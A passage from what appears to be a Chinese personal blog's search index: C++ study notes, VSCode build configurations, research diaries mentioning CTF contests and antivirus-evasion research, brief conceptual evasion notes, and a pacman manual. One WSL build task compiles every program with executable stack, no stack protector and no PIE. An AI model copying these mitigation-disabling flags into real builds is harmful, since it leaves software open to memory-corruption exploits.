1)-&gt;year;//*p3表示第一个元素，同时也是指针，先解引用，得到的是&amp;s1，但是+1得到的不一定是下一个元素地址，可能不连续 (*(*p3 + 1)).year;  (*(p3 + 1))-&gt;year;//p3表示&amp;p2的地址，先+1得到的是下一个元素的地址，然后解引用得到结构体地址，是正确的访问思路 (*(*(p3 + 1))).year;  //*(*p4)[3]类型指针，指向整个指针数组 auto p4{&amp;p2}; cout &lt;&lt; p4 &lt;&lt; endl;//和&amp;p2等价，整个指针数组的地址，是一个整体 cout &lt;&lt; *p4 + 1 &lt;&lt; endl;//先解引用，和p2以及&amp;p2[0]等价，数组首地址，+1得到第二个元素地址 cout &lt;&lt; *(*p4 + 1) &lt;&lt; endl;//再一次解引用，得到第二个元素的值，就是&amp;s2的值cout &lt;&lt; (*(*p4 + 1))-&gt;year &lt;&lt; endl;//访问结构体的值   正确的二级指针访问的汇编代码如下所示：   mov     rax, [rbp+p1] add     rax, 8 mov     rax, [rax] mov     eax, [rax+8]   数组模板   主要是vector和array两个模板类，都定义在std命名空间中，使用需要包含相应头文件。vector存储在heap，大小可变。array存储在stack，大小不可变。array对象可以直接进行对象赋值。使用at方法可以检查index是否越界。   vector&lt;int&gt; vt{5, 4, 3, 2, 1}; //vector&lt;int&gt; vt(5);  array&lt;int, 5&gt; ai{1, 2, 3, 4, 5};   for循环结构   for循环的组成部分。      设置初始值。   执行测试条件，判断循环是否继续。   执行循环操作。   更新值。   声明语句表达式，关于这个概念，是指在for循环的初始化部分可以是表达式语句，也可以是声明。   前缀和后缀   前缀表达式的效率比后缀表达式的效率高因为前缀函数直接运算后返回结果。而后缀首先复制一个副本，然后计算表达式，最后返回副本。 如果递增运算符和指针结合，需要考虑到运算符的优先级和结合顺序。前缀运算符和解引用优先级相同，从右向左结合；后缀运算符优先级更高，从左向右结合。   关于逗号表达式：逗号表达式首先计算第一个表达式，然后计算第二个表达式。整个逗号表达式的值是最后部分的值。   cata = 17, 140;//等价于(cata = 17) , 140; cata值为17 cata = (17, 140);//括号优先级最高，cata值为140   关于延时循环，使用clock函数，直接贴代码。   //#include &lt;bits/stdc++.h&gt; #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;array&gt; #include &lt;string&gt; #include &lt;cstring&gt; #include &lt;ctime&gt; using namespace std;  int main() {     float secs{5.0};     clock_t delay = secs * CLOCKS_PER_SEC;// 将延时秒数乘以宏，得到以系统时间为单位的时间     cout &lt;&lt; \"starting!\" &lt;&lt; endl;     clock_t start = clock();//返回的是系统时间     while (clock() - start &lt; delay);//死循环延时     cout &lt;&lt; \"done\" &lt;&lt; endl;     return 0; }   别名   C++使用两种方式定义别名。分别是预处理器和typedef关键字。尽量用typedef，预处理器错误太多了。   #define  BYTE1 char typedef char byte1, *charptr;   C++11循环   for (auto i : {4.99, 10.99, 6.87, 7.99, 8.49})//或者用引用类型，可以修改变量的值   cout &lt;&lt; i &lt;&lt; endl;   循环和文本输入   文件尾条件，称为EOF，操作系统都支持重定向，允许用文件替换键盘输入。比如get.exe &lt; test.txt可以将文件输入至该程序中。小于号是重定向运算符。cin对象在检测到EOF之后，设置eofbit和failbit为true。可以通过对应的成员函数cin.eof()和cin.fail()查看。所以在循环输入的时候，可以通过这个方法检测输入是否完成，这是常规的做法。   char ch; cin.get(ch); while(cin.fail() == false)// 常见的做法 {   cin.get(ch); }  while(cin.get(ch)) // 更有效的做法 {    }   第二种如代码所示，istream类提供了一个istream对象转换成bool类型的函数，即cin可以作为while的测试条件，这比检测fail更有效，因为能检测磁盘故障等问题。鉴于get方法返回的还是cin对象，所以可以直接精简成上面的测试条件。   cin.get()和cout.put()，以及getchar()和putchar()类似。在iostream中，EOF被定义为-1。可以使用cin.get()和cout.put()代替上面的函数，然后用EOF代替cin.fail()。注意cin.get()返回的是int类型的值，不是char。后面输出的时候也要强制转换。   // 普通版本，g++编译其实没问题 int ch; ch = cin.get(); while(ch != EOF) {   cout.put(ch);   ch = cin.get(); }  // 更好的版本 int ch; while ((ch =  cin.get()) != EOF) {   cout.put(char(ch)); }   主要是因为两套不一样的函数，分别是cin.get(ch)和cin.get()。cin.get(ch)返回的是istream对象，即cin，可以连续读取。而cin.get()返回的是int类型的值。   嵌套循环和二维数组   int  maxtmps[2][3]{     {96, 13, 58},     {23, 684, 83} };   初始化方式如上所示。   分支语句   取反运算符的优先级高于所有关系运算符和算术运算符。 逻辑与运算符优先级高于逻辑或运算符。 C++保留了and、or和not关键字。   cctype   引入头文件cctype。      其中_ISbit宏如下。   # define _ISbit(bit) ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))   读取数字   如果没有正确读取到数字，变量的值将不变，输入将保留在输入流中，cin将设置错误标记，同时返回false。后续需要使用clear()方法重置错误标记。常见的做法是while(cin&gt;&gt;x)通过cin对象判断输入是否成功，失败则退出，否则继续。如果失败还需要继续读取，则需要重置，设置cin.clear()来接受新的输入，然后删除错误的输入序列，再进行新的输入。   int x; while (!(cin &gt;&gt; x))//判断读取是否成功 {     cin.clear();//重置输入     while (cin.get() != '\\n')//删除输入序列     {         continue;     }     cout &lt;&lt; \"please input\" &lt;&lt; endl; }   文件输入输出   这里讨论的主要是文本文件的输出。需要引入头文件fstream和ofstream类的对象，通过open和close方法进行文件输出。最后使用«输出到文件中。输入也是相同的方法，定义ifstream的对象，然后调用方法进行输入。通过good方法，能检测所有的问题，包括磁盘错误，文件受损，读取EOF，类型不匹配等等。   #include &lt;fstream&gt; //输出 ofstream fout; fout.open(\"out.txt\"); fout &lt;&lt; endl; fout.close();  //输入 char cintext[50]; ifstream fin; fin.open(\"in.txt\"); if (!fin.is_open())//判断是否打开成功 {     exit(EXIT_FAILURE); } fin &gt;&gt; cintext; fin.getline(cintext, 50); fin.close();  //最好的输入检测方式 while(fin &gt;&gt; value)//自动调用good方法判断是否成功 {   ... }   混合输入的时候，cin.getline(array, len)读字符串，cin&gt;&gt;x读数字，然后cin.get()读换行符。  ","categories": [],
        "tags": ["C++"],
        "url": "https://zjgcjy.github.io/posts/2019-07/CPP-Prime-Plus-Learning2.html",
        "teaser":null},{
        "title": "Vscode_configuration",
        "excerpt":"   关于Vscode的配置信息 主要是win下的C++ （wsl）以及 python 还有java（todo）      基于WSL的C++环境   主要是三个文件。      c_cpp_properties.json 用来配置VScode的插件。   task.json 用来设置任务，即对文件进行编译，快捷键是ctrl+shift+B。   launch.json 用来设置调试信息，这里使用的是WSL的gdb。   下面给出详细的配置文件。   c_cpp_properties.json的配置如下：   {     \"configurations\": [         {             \"name\": \"wsl\",             \"includePath\": [                 \"${workspaceFolder}/**\"             ],             \"defines\": [                 \"_DEBUG\",                 \"UNICODE\",                 \"_UNICODE\",                 \"__linux__\",                 \"__x86_64__\"             ],             \"windowsSdkVersion\": \"10.0.18362.0\",             \"compilerPath\": \"/usr/bin/g++\",             \"intelliSenseMode\": \"gcc-x64\",             \"cStandard\": \"c11\",             \"cppStandard\": \"c++17\",             \"browse\": {                 \"path\": [                     \"${workspaceFolder}/**\"                 ],                 \"limitSymbolsToIncludedHeaders\": true             }         }     ],     \"version\": 4 }   launch.json的配置如下：   {     \"version\": \"0.2.0\",     \"configurations\": [         {             \"name\": \"(gdb) Launch\",             \"type\": \"cppdbg\",             \"request\": \"launch\",             \"program\": \"${fileBasenameNoExtension}\",             \"args\": [                 \"\"             ],             \"stopAtEntry\": true,             \"cwd\": \".\",             \"environment\": [],             \"externalConsole\": true,             \"windows\": {                 \"MIMode\": \"gdb\",                 \"miDebuggerPath\": \"/usr/bin/gdb\",                 \"setupCommands\": [                     {                         \"description\": \"Enable pretty-printing for gdb\",                         \"text\": \"-enable-pretty-printing\",                         \"ignoreFailures\": true                     }                 ]             },             \"pipeTransport\": {                 \"pipeCwd\": \"${fileDirname}\",                 \"pipeProgram\": \"c:\\\\windows\\\\System32\\\\bash.exe\",                 \"pipeArgs\": [                     \"-c\"                 ],                 \"debuggerPath\": \"/usr/bin/gdb\"             },             \"targetArchitecture\": \"x64\",             \"sourceFileMap\": {                 \"/mnt/c\": \"${env:systemdrive}/\",                 \"/mnt/d\": \"d:\\\\\",                 \"/usr\": \"C:\\\\Users\\\\zjgcj\\\\AppData\\\\Local\\\\Packages\\\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\\\LocalState\\\\rootfs\\\\usr\\\\\"             },             \"preLaunchTask\": \"Make cpp on Wsl\"         }     ] } //\"program\": \"./${fileBasenameNoExtension}\", //\"cwd\": \"${workspaceFolder}\", //\"pipeProgram\": \"c:\\\\windows\\\\sysnative\\\\bash.exe\", //\"debuggerPath\": \"gdb -q\",   task.json的配置如下：   {     \"version\": \"2.0.0\",     \"windows\": {         \"options\": {             \"shell\": {                 \"executable\": \"c:\\\\windows\\\\System32\\\\wsl.exe\",                 \"args\": [                     \" \"                 ]             }         }     },     \"tasks\": [         {             \"label\": \"Make cpp on Wsl\",             \"type\": \"shell\",             \"command\": \"g++\",             \"args\": [                 \"-g\",                 \"./${fileBasename}\",                 \"-z\",                 \"execstack\",                 \"-fno-stack-protector\",                 \"-no-pie\",                 \"-o\",                 \"./${fileBasenameNoExtension}\",                 \"-std=c++17\",                 \"&amp;&amp;\",                 \"clear\",                 \"&amp;&amp;\",                 \"./${fileBasenameNoExtension}\"             ],             \"group\": {                 \"kind\": \"build\",                 \"isDefault\": true             },             \"problemMatcher\": {                 //\"$gcc\"                 \"owner\": \"cpp\",                 \"fileLocation\": [                     \"relative\",                     \"${workspaceRoot}\"                 ],                 \"pattern\": {                     \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",                     \"file\": 1,                     \"line\": 2,                     \"column\": 3,                     \"severity\": 4,                     \"message\": 5                 }             }         }     ] }   基于MSCV的C++环境   MSVC配置C/C++编译环境 需要注意的主要是环境变量的配置问题。还有文件编码问题，由于控制台模式是gbk编码，代码页是936（chcp命令），而vscode默认编码是utf-8，所以中文什么的输出就很烦。   c_cpp_properties.json的配置文件：   {     \"configurations\": [         {             \"name\": \"Win32\",             \"includePath\": [                 \"${workspaceFolder}/**\"             ],             \"defines\": [                 \"_DEBUG\",                 \"UNICODE\",                 \"_UNICODE\"             ],             \"windowsSdkVersion\": \"10.0.18362.0\",             \"compilerPath\": \"C:/Program Files (x86)/Microsoft Visual Studio/2019/Community/VC/Tools/MSVC/14.22.27905/bin/Hostx86/x86/cl.exe\",             \"intelliSenseMode\": \"msvc-x64\",             \"cStandard\": \"c11\",             \"cppStandard\": \"c++17\",             \"browse\": {                 \"limitSymbolsToIncludedHeaders\": false             }         }     ],     \"version\": 4 }   launch.json的配置文件：   {     // 使用 IntelliSense 了解相关属性。      // 悬停以查看现有属性的描述。     // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387     \"version\": \"0.2.0\",     \"configurations\": [         {             \"name\": \"(mscv) Run\",             \"type\": \"cppvsdbg\",             \"request\": \"launch\",             \"program\": \"cmd\",             \"args\": [                 \"/C\",                 \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\",                 \"&amp;\",                 \"pause\"             ],             \"stopAtEntry\": false,             \"cwd\": \"${workspaceFolder}\",             \"environment\": [],             \"externalConsole\": true,             \"preLaunchTask\": \"msvc build\"         },         {             \"name\": \"(msvc) Debug\",             \"type\": \"cppvsdbg\",             \"request\": \"launch\",             \"program\": \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\",             \"args\": [],             \"stopAtEntry\": true,             \"cwd\": \"${workspaceFolder}\",             \"environment\": [],             \"externalConsole\": true         }     ] }   tasks.json的配置文件：   {     // 有关 tasks.json 格式的文档，请参见     // https://go.microsoft.com/fwlink/?LinkId=733558     \"version\": \"2.0.0\",     \"tasks\": [         {             \"type\": \"shell\",             \"label\": \"msvc build\",             \"command\": \"\\\"C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\Community\\\\Common7\\\\Tools\\\\VsDevCmd.bat\\\"\",             \"args\": [                 \"&amp;&amp;\",                 \"cl.exe\",                 \"/Zi\",                 \"/EHsc\",                 \"/Fe:\",                 \"${fileDirname}\\\\${fileBasenameNoExtension}.exe\",                 \"${file}\"             ],             \"group\": {                 \"kind\": \"build\",                 \"isDefault\": true             },             \"presentation\": {                 \"reveal\": \"always\"             },             \"problemMatcher\": [                 \"$msCompile\"             ]         }     ] }   现在先弄这两个吧。python也是个大头，不过先等等。  ","categories": [],
        "tags": ["vscode"],
        "url": "https://zjgcjy.github.io/posts/2019-07/VScode_configuration.html",
        "teaser":null},{
        "title": "Cpp Prime Plus Learning3",
        "excerpt":"   C++ Prime Plus 读书笔记3 第7章到第8章 主要是函数      函数   C++规定函数的返回值不能是数组。函数原型不需要提供变量名。如果不指定参数列表，应该使用省略号。如果参数不满足原型要求，会自动进行强制类型转换，如果有函数重载则会有二义性。   函数和数组   数组传参的基本格式如下。实际上就是指针。函数传递普通的值是变量的拷贝，但是传递数组还是原来那个数组。如果不需要修改数组，可以加上const限定符。且需要指定数组的大小，因为这不是指向整个数组的指针，如果用sizeof查看变量大小，是指针的大小4。   int sum_arr(const int arr[], int n);//int *arr的指针   也可以使用基于范围来传参。一般就是首地址和首地址加数组长度作为参数传递。   int sum_arr(const int *begin, const int *end); {     const int *pt;     for(pt = begin; pt != end; pt++)     {         ...     } }   关于指针和const限定符，主要有2种，即常指针和指向常量的指针。在不讨论指针的情况下，可以将const数据或非const数据复制给const指针，不能将const数据赋值给非const指针。所以函数参数尽量是const。   const int *p = &amp;x;//指向常量的指针 int *const p = &amp;x;//常指针 const int* const p = &amp;x;//指向常量的常指针   函数和二维数组   //二维数组传参方式 int sum(int (*arr)[4], int row); int sum(int arr[][4], int row);  int total[3][4]   注意，二维数组是以行为单位创建数组，每个数组再创建一个一维数组。所以二维数组就是3个指向一维数组整体的指针，这里的n是行数。传参时必须指定列数。   注意使用RAII，不要在不同的地方析构对象。   函数指针   浅谈数组指针、指针数组、函数指针、函数指针数组   函数名代表了函数的地址。函数指针的申明方法：直接将对应的函数申明种函数名改成一个指针即可。   double pam(int); double (*p)(int);  //p = &amp;pam 代表函数地址 //*p = pam 代表函数整体吧   ","categories": [],
        "tags": ["C++"],
        "url": "https://zjgcjy.github.io/posts/2019-07/CPP-Prime-Plus-Learning3.html",
        "teaser":null},{
        "title": "八月日记",
        "excerpt":"   每日所作所得      8月1日   上午和学姐讨论，准备支持学姐的工作，讨论下接下来应该做什么。 下午电脑在更新，更新了半天。。。 然后晚上取打球了，回来之后vm打不开了，win10更新了sandbox和docker以及wsl2，环境又崩了。无语，在弄环境。   8月2日   上午继续装环境，然后10点多又和学姐讨论了接下来的工作，也和黄老师聊了下自己的方向和接下来的进展。下午系统更新了，hyper -v虚拟化是真的垃圾，不好用啊，花了好长时间才卸载完。   8月3日   周六，今天有xctf的比赛，看了一下，简单做了一个逆向和一个misc。下午看了后面2个逆向，不想做了，状态不怎么好，感冒很不舒服。 晚上把外面位置都打扫了一边，开始把东西搬出来。   8月4日   一直在忙着搬东西，下午才弄好。然后开始配网络，试了好久就是不能配ipv6，很烦。 快到晚上的时候才弄出来，用了2个路由器，第一个当中继，第二个做路由器，结果还行。   8月5日   上午开了组会，确定了这周要弄的东西，我自己也开始准备搞学姐的实验了。下午首先去试了一个样例的运行结果，遇到一些问题，和学姐讨论了。 下午主要攻克编译链接的问题，编译老是有问题，最后是安装好了vs2005下的masm32的，实现了编译的过程。晚上把脚本写好了，对20000个程序进行编译。   8月6日   昨天晚上走的时候看见编译结果了，大约有6000多个编译失败了，走的时候开了日志重新编译。 今天早上去看了一下，发现是测试指令的问题，暂时没有解决办法，所以先写个脚本把这些有问题的单独抽出来吧。然后改了编译指令，重新再编译一次。 中午重新修改了脚本，最后得到5811个样例测试失败，筛出来后，大致看了下指令的分类，主要是一些奇怪的指令不能通过编译。 下午收到邮件说服务器被重置了，不明觉厉，ss需要重启一下，我晕。 晚上下定决定买了surface pro 6 i5+8+256。心疼，等到了再买配件好了。   8月7日   上午基本没干嘛，效率有点低。 中午开始编译批量编译用的框架并开始测试windbg用的脚本，希望一切顺利吧。 不顺利，进行重命名的批量化工作。下午把批量化命名的工作都做完了，重新装了windbg，配好了调试环境，晚上准备写脚本然后进行自动化获取。 在如何进行批量执行的过程中，遇到的问题有：windbg脚本学习问题，windbg命令执行失败的问题（最后也没解决，但是能取巧）Unicode环境下宽字节处理问题，ShellExecute异步执行的问题。 整理了一下，好像没什么问题，准备去跑18000个了。   8月8日   早上过来看了结果，服了，只编译了2329个，这是真的慢。日志显示凌晨5点就停了，不知道为啥。 为了批量执行同时控制区间，上午重新修改了starter的脚本，然后准备去测试。 下午就等他自动跑完所有的测试样例就行了，然后每过一会去看下有没有什么问题。 黄老师让我帮他调研源代码级的免杀资料，好吧，借这个机会把那本书看一下。 去看了在跑的程序，跑到2点多就停了，后来又试了几个，确实跑不起来，调试了一下，我醉了，抛出了异常，由于之前没有改名，找不到源代码，这里是我失策了。去整理了下做的东西，然后开始重新编译生成文件，吃完饭回来重新批量执行。   8月9日   今天上午来看了执行结果，结果发现有很多有问题，然后重新修改了代码，采用了一个取巧的方式，直接在starter中判断当前的循环次数是不是2，如果是2就说明碰到异常，然后采取和完整测试一样的逻辑恢复控制变量。然后就等着继续跑就行了。 下午电脑到了，happy。   8月10日   上午主要在装环境，测试surface，下午也是。把vs装完之后就去打球了，达到8点多，洗完澡和张翔去MacDonald，他请客哈哈。 晚上回到所里开始贴膜，爱惜我的surface。 走之前去看了学姐的实验，基本没问题，就是有2个程序卡住了，不知道为啥没断下来。暂时没仔细研究。   8月11日   今天上午主要在摸鱼，然后把tpye cover和surface pen进行了测试，还是很舒服的。这两天花的钱太多了，吃土了妈的。 下午和晚上在继续装系统和虚拟机。晚上去看了机器，发现又卡住了，懵逼了，   8月12日   一周总结，编译问题，windbg脚本问题，windbg程序问题，windbg命令执行失败的问题（最后也没解决，但是能取巧：运行程序名）Unicode环境下宽字节处理问题，ShellExecute异步执行的问题，程序异常的问题，修改守护进程脚本，最后编译了13601个。也成功运行记录了状态信息。 今天上午开了组会，确定了这周的任务。一是继续跑学姐的实验，二是继续调xen的环境，三是帮老师调研信息。 下午继续看学姐的实验问题，主要把测试环境给打包，方便下一步进行测试，同时和学姐讨论了下一步的工作，主要对xen进行测试，但是我试了很长时间，那台机器上的xen老是起不来东西，就很烦。 然后和学姐讨论了用我那边的机器。 晚上继续调试机器，xen上的环境怎么也装不上去，无语。   8月13日   上午继续去装xen的环境，后来想想算了，直接静态编译好了，于是就搞起来了。编译完去试了发现还是不行，貌似是学姐电脑问题，就很烦。还没有试我自己的。 下午开始弄黄老师的报告，同时也继续弄学姐的环境，还去调了一下xen的问题，发现调试是真的卡，就很烦。简单用exp打了一下，发现没什么问题。晚上准备把学姐那个环境跑起来，争取能有进度，最后不停重启网络，然后xen里面可以连到外面了，设置好了之后快8点的时候开始跑起来了。 我要充电 过了一会又去看跑的结果，发现又卡住了，服了，说什么未证明的开发者，调了IE的安全模式还是不行。还好激活了系统，最后是设置了组策略，终于弄好了。   8月14日   上午回来继续看了学姐的那个实验，没啥问题，然后继续调研黄老师说的免杀技术研究，感觉调研的都不是最新的技术，不过确实免杀最近比较少了。 下午也是继续整理免杀的资料，主要是2篇文档吧，最后总结了一些东西，然后和黄老师交流了，接下来又给了新的任务。主要是black hat会议的相关内容，还要去做个实验，是ccl特征码定位的实验，好烦，论文还没看。   8月15日   今天主要在打比赛，准备拿个名次的，然后上午做了一个re，又是llvm的，服了。还看了下misc的东西，无感。 下午继续做第二个re，卧槽我真是菜的不行，给了源码都看不懂，仔细分析之后才发现一个是求开平方，一个是求素数，妈耶。继续看了几个其他的misc，果然i春秋的比赛就是煞笔的不行。下午的时候，学姐xen那边的东西终于跑完了。 今天晚上回去的比较早，主要是去了趟麦当劳，然后又是中元节就想早点走了。除此以外看了免杀的书，开始弄下win的环境，好多东西没看啊，我是真的想充电，好烦啊。走的时候一叶飘零又找我去讲课，无奈又是时间冲突，去不了啊。   8月16日   今天上午主要开始英语报名，然后又是接着搭建环境。我表示心很累。 下午在看免杀的东西，然后林大佬扔过来一个样本，简单分析了一下。学到了挺多东西的。我还是太菜了。   8月17日   今天主要也是在打比赛，打了SUCtf的，晚上总结一下，主要还是逆向分析吧，感觉自己漏洞还是学的太少了，还有静态代码分析的功力不够，密码学的知识也不够。很伤啊。 而且今天知道宿舍是单人间改的双人间，好烦。   8月18日   打比赛   8月19日   今天主要开了组会，和学姐交接了相关内容，然后开始继续自己的学习工作，同时看了几个wp，整体而言效率不是很高，因为国科大分配宿舍的事情，搞得人心惶惶。   8月20日   今天是周二，效率不是很高，哈哈。其实是后来忘记做了啥事情了。   8月21日   今天周三，上午做了事情，下午就出去嗨了，没做多少事情。   8月22日   今天是搬家的一天，一大早坐车来了雁栖湖，这是真的累。下午就在搬家然后做事情，没干什么正事。晚上去打球了，还是很舒服的，体验了一下雁栖湖的生活。   8月23日   一大早就出去跑步了，然后准备今天下午的比赛。先看了巨神的题目，我想弃坑。   8月24日   做了一天的比赛，比赛结束后算是打了3个题。   8月25日   打比赛，oppo的，做了一个压缩算法的题，lz77？没搞出来。后来做了一个nsis的程序逆向，学到了新知识。   8月26日   做了m4x大哥出的题目，然后晚上去打球了，回来把衣服也洗完了。   #  ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-08/%E5%85%AB%E6%9C%88%E6%97%A5%E8%AE%B0.html",
        "teaser":null},{
        "title": "Anti Antivirus Technology Offensive And Defensive Notes 1",
        "excerpt":"   黑客免杀攻防读书笔记      第一章   免杀不只是特征码，所谓特征码就是病毒或木马所特有的一段二进制代码，杀毒软件所用的特征码是异常复杂的，通常包括数据特征片段和一定的逻辑判断机制组合而成。   关于免杀的分类，主要分为三种。      行为免杀，通过控制病毒木马的行为来躲过杀毒软件的检测，用到的技术之一就是Rootkit。   关于杀毒软件的发展，其中之一是注重其功能性，加入人工智能和云计算等技术思想；另一类是脱离系统，向硬件靠拢，将后门安装在BIOS中，实现小型化和精确化。   第二章   免杀的相关基础知识，   ","categories": [],
        "tags": ["免杀"],
        "url": "https://zjgcjy.github.io/posts/2019-08/Anti-AntiVirus-Technology-Offensive-and-Defensive-Notes-1.html",
        "teaser":null},{
        "title": "十月日记",
        "excerpt":"   每日所作所得      10月1日   周日，上课前最后一天，算是给自己放了最后一天假期   10月2日   上了第一天的课，主要是os，一脸蒙蔽。  ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-10/%E5%8D%81%E6%9C%88%E6%97%A5%E8%AE%B0.html",
        "teaser":null},{
        "title": "Pacman_helper",
        "excerpt":"   pacman 手册      archlinux pacman 命令 arch wiki   pacman -Sy 仅同步源   pacman -Syu 同步源，并更新系统   pacman -Su –ignore foo 升级时不升级包foo   pacman -S abc 从本地数据库中得到abc的信息，下载安装abc包   pacman -Sy abc 和源同步后安装名为abc的包   pacman -Sd abc 忽略依赖性问题，安装包abc   pacman -Sf abc 强制安装包abc   pacman -Si abc 从数据库中搜索包abc的信息   pacman -Ss abc 搜索有关abc信息的包   pacman -Sg abc 查询abc这个包组包含的软件包   pacman -Sw abc 下载包而不安装它   pacman -R abc 删除abc包   pacman -Rc abc 删除abc包和依赖abc的包   pacman -Rsn abc 删除包所有不需要的依赖包并删除其配置文件   pacman -Rscn abc 删除abc包所有不需要的依赖包和依赖abd的包并删除其配置文件   pacman -Sc 清理/var/cache/pacman/pkg目录下的旧包   pacman -Scc 清除所有下载的包和数据库   pacman -Q 列出系统中所有的包   pacman -Q package 在本地包数据库搜索(查询)指定软件包   pacman -Qi package 在本地包数据库搜索(查询)指定软件包并列出相关信息                  pacman -Q       wc -l 统计当前系统中的包数量           pacman -Qdt 找出孤立包   pacman -Rns $(pacman -Qtdq) 删除孤立软件包（递归的,小心用)   pacman -U abc.pkg.tar.gz 安装下载的abs包，或新编译的本地abc包   pacman-optimize &amp;&amp; sync 提高数据库访问速度   ==== 提高pacman数据访问 ====   pacman-optimize &amp;&amp; sync   ==== 使用wget ====   修改/etc/pacman.conf并在其中的[options]   XferCommand = /usr/bin/wget -c –passive-ftp -c %u   来自：http://www.douban.com/group/topic/17909752/     Pacman手册   名称   pacman – 软件包管理器   句法   pacman  [选项] [软件包名称]   描述   pacman是linux系统上的用于记录安装的软件包信息的管理器。它的主要特点有：支持依赖、软件包组、安装卸载关联以及与远程服务器同步信息然后更新系统。pacman的软件包格式是.tar.gz的压缩格式。   3.0.0版以来，pacman一直是linkman:libalpm（即”Arch Linux软件包管理“函数库）的前端。这个函数库支持不同写法的前端（例如，它支持图形化前端）。   命令   -Q，–query 查询   查询软件包数据库。运用这条命令你不仅可以查看已安装软件包以及所含文件的信息，还可以查看独立软件包的元信息（meta-information）（包括软件包的依赖，冲突，安装日期，创建日期，大小）。这条命令可已对本机的软件包数据库执行，也可以对独立的.tar.gz包执行。具体参看下面的查询选项。   -R, –remove 移除   从系统中移除某个软件包。该命令也可以对软件包组执行，执行后，软件包组内所有的软件包都会被移除。属于指定软件包的文件会被删除，而后软件包数据库会执行更新。除非加上–nosave(不保存)选项，移除软件包的配置文件都会以.pacsave的后缀保存。具体参看下面的移除选项。   -S, –sync 同步   同步软件包。软件包是从frp服务器上直接下载安装的，与之一同安装的还有运行软件所需的所有依赖。例如，pacman -S qt 会下载并安装qt以及qt的所有依赖。如果同一名称的软件包存在与不同的源中，可以指定源：pacman -S testing/qt。同样也可以给定版本要求：pacman -S “bash&gt;=3.2”（引号是必需的，否则设shell会将“&gt;”理解为重定向）。   可以指定软件包，也可以指定软件包组。例如，如果gnome是一个已定义的软件包组，那么执行pacman -S gnome就会将gnome组中所有的软件包安装，当然也会安装这些软件包的依赖。   pacman也可以处理一些具有相同或相近作用的软件包。例如，执行pacman -S foo，pacman首先会搜索名为foo的软件包。如果没有找到的话，pacman就会搜索一些具有相同或相近作用的软件包。如果找到了具有相同或相近作用的软件包，这些软件包就会被安装。   你也可以用pacman -Su来升级本机上所有陈旧的软件包升级是这样进行的：pacman先将本机上的软件包同远程服务器上的软件包进行版本对比。版本对比是按照如下规则进行的：   字母顺序：   1.0a&lt;1.0alpha&lt;1.0b&lt;1.0beta&lt;1.0p&lt;1.0pre&lt;1.0rc&lt;1.0   数字顺序：   1&lt;1.0&lt;1.1&lt;1.1.1&lt;1.2&lt;2.0&lt;3.0.0   -U, –update   升级软件包，或安装软件包。可以给定一个URL网址，也可以给定一个文件路径。升级的过程是一个“移除，然后安装”的过程。想知道pacman如何处理配置文件，请查看处理配置文件   -V, –version 版本   显示版本，然后退出。   -h， –help 帮助   显示给定命令的句法。如果没有给定命令，显示的将是全部命令的句法。   通用选项   –asdeps [as dependency(作为依赖)]   模糊安装软件包;换句话说，就是假定该软件包安装的原因是由于依赖。在使用makepkg以及其他从源代码编译的工具时，需要在编译一个软件包之前安装该软件包的依赖，这时候，这个命令选项就十分有用了。   –asexplicit   精确安装软件;换句话说，就是假定该软件包安装的原因是精确安装。如果想把一个依赖标记成精确安装，使它不会在执行带–recursive（递归）的移除命令时删除，这时候，这个命令选项就十分有用了。   -b, –dbpath    指定另外的数据库位置;默认为/var/lib/pacman，路径为绝对路径。   -d, –nodeps            略过所有依赖关系检查-   -f, –force               强制安装，覆盖存在冲突的文件（谨慎使用）;   -r， –root     指定其他的根路径;用于向暂时挂载的其他系统根路径安装软件。   -v, –verbose          输出路径，例如根路径，配置文件，数据库，缓存的路径等。    –cachedir &lt;dir&gt; 指定其他缓存路径;默认为/var/cache/pacman/pkg，路径为绝对路径。   –config &lt;路径&gt;  指定另外的配置文件   –logfile &lt;路径&gt; 指定另外的日志文件   –noconfirm      不询问确认   –noprogressbar  下载文件时不显示进度条   –noscriptlet    不执行安装脚本集（谨慎使用）;   查询选项   -c, –changelog      查看某软件包的更新日志   -d, –deps           列出所有作为依赖关系安装的软件包   -e, –explicit       列出所有单独指定安装的软件包   -g, –groups         查看某软件包组所属的所有软件包   -i, –info           查看软件包信息（-ii 查看备份文件）   -l, –list           列出被查询软件包的内容   -m, –foreign        列出没有在同步数据库时找到的已安装软件包   -o, –owns      查询哪个软件包拥有     -p, –file    从某个软件包而不是数据库查询   -q, –quiet          在查询或搜索时显示较少的信息   -s, –search  搜寻符合指定字符串的已安装本地的软件包   -t, –unrequired     列出所有不被其他软件包要求的软件包   -u, –upgrades       列出所有可升级的软件包   -p，–file           在命令行标记软件包为文件，而不是数据库信息条目，在与–info和–list搭配时有用。   移除选项   -c, –cascade        删除软件包及所有的依赖于此的软件包   -k, –dbonly         只删除数据库记录，不删除文件   -n, –nosave         同时删除配置文件   -s, –recursive      同时删除（不会破坏其他软件包的）依赖关系                      (-ss·也包括单独指定安装的依赖关系)   -u, –unneeded       同时删除不需要的（且不会破坏其他软件包的）依赖关系   同步选项   -c, –clean          从缓存目录中删除旧软件包（-cc 清除所有）   -g, –groups         查看某软件包组所属的所有软件包   -i, –info           查看软件包信息   -l, –list     查看在该软件仓库中的软件包清单   -q, –quiet          在查询或搜索时显示较少的信息   -p, –print-uris     打印指定软件包及依赖关系中的URI   -s, –search  按照指定字符串查询远端软件仓库   -u, –sysupgrade     升级所有过期软件包   -w, –downloadonly   下载但不安装/升级软件包   -y, –refresh        从服务器下载新的软件包数据库     –needed         不重新安装已经为最新的软件包    –ignore &lt;软件包&gt;   升级时忽略某个软件包（可多次使用）    –ignoregroup &lt;软件包组&gt;                       升级时忽略某个软件包组（可多次使用）  ","categories": [],
        "tags": ["pacman"],
        "url": "https://zjgcjy.github.io/posts/2019-10/Pacman_Helper.html",
        "teaser":null},{
        "title": "Software_security_project",
